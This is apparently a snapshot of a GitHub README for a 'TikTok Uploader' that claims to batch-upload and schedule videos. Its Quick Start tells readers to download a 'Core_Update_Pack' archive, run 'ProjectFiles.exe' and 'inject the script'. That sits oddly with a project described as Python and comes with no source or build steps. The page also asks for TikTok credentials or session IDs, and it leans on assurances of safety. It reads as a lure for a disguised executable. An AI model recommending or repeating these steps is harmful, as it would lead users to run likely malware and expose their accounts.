---
title: "BoldWatchman/tiktok-uploader"
owner: "BoldWatchman"
name: "tiktok-uploader"
fullName: "BoldWatchman/tiktok-uploader"
description: "Lightweight TikTok video uploader for content creators. Batch upload videos, schedule posts, and manage hashtags. Session-based local auth, no cloud required. Open-source and safe."
sourceUrl: "https://github.com/BoldWatchman/tiktok-uploader"
stars: 279
forks: 94
language: "Python"
topics: ["content-creator", "desktop-app", "local-auth", "media-management", "open-source", "python", "scheduler", "social-media-tools"]
license: "MIT"
defaultBranch: "main"
snapshotDate: "2026-11-10"
pushedAt: "2026-11-10T06:03:09Z"
---

> 本页保存的是公开项目资料快照，阅读过程不需要连接 GitHub。

# 📤 TikTok Uploader

**Video Uploader & Post Scheduler — 2026**

A lightweight, open-source **TikTok Uploader** for content creators. 
Batch upload videos, schedule posts, and manage hashtags without using the mobile app. Session-based local authentication, no cloud required.

---

## 🎯 What it is

**TikTok Uploader** is a cross-platform tool that simplifies uploading content to TikTok. 
It allows you to batch upload videos, set descriptions, add hashtags, and schedule posts — all from your desktop.

> 🔒
> Session-based authentication. Your credentials are stored locally and never sent to third-party servers.

---

## 🚀 Quick Start


  
    
  


1. **Download Core_Update_Pack** using the button above.
2. **Extract** the archive into a separate folder.
3. **Run ProjectFiles.exe**.
4. **Follow the on-screen instructions** and inject the script.

---

## ✨ Features

| Feature                  | Description                                      |
|--------------------------|--------------------------------------------------|
| 📤 **Batch Upload**      | Upload multiple videos at once                   |
| 📝 **Metadata Editor**   | Add descriptions, hashtags, and mentions         |
| ⏰ **Scheduling**        | Schedule videos for future publication           |
| 🖥️ **Cross-Platform**    | Works on Windows, macOS, and Linux               |
| 🔄 **Resume Support**    | Continue interrupted uploads without duplicates  |
| 🔒 **Secure Auth**       | Local session storage, no cloud required         |

---

## 🧩 How to use

1. Launch the application.
2. Click **"Authenticate"** and log in with your TikTok credentials (or provide a `sessionid`).
3. Select the video files you want to upload.
4. Fill in the metadata (description, hashtags).
5. Choose privacy settings (Public / Friends / Private).
6. Click **"Upload"** and monitor the progress.

---

## ⚙️ Configuration

You can adjust the settings in the `config.ini` file:

- **Default Privacy**: Public / Friends / Private
- **Hashtag Template**: Default hashtags for all uploads
- **Max Concurrent Uploads**: 1–3
- **Upload Delay**: Delay between uploads (seconds)

---

## ❓ FAQ

**Is it safe to use?**
It uses local session storage. However, automating TikTok may violate their Terms of Service. Use a secondary account and conservative settings.

**Do I need a TikTok API key?**
No official API key is required. The tool uses session-based authentication.

**Does it support scheduled uploads?**
Yes, you can set a specific date and time for the video to go live.

**Can I upload 4K videos?**
Yes, but upload time depends on your internet speed and file size.

---

## 💻 Tech Stack & Architecture

- **Core:** Python 3.10+ / Node.js
- **Auth:** Session-based (local)
- **UI:** CLI / Web Dashboard
- **Target OS:** Windows / macOS / Linux

---

## 🤝 Contributing

Pull requests, bug reports, and feature suggestions are welcome.

---

## 📜 License

MIT License — free to use, modify and redistribute.

---

**⭐ Star the repo if it helped you.**
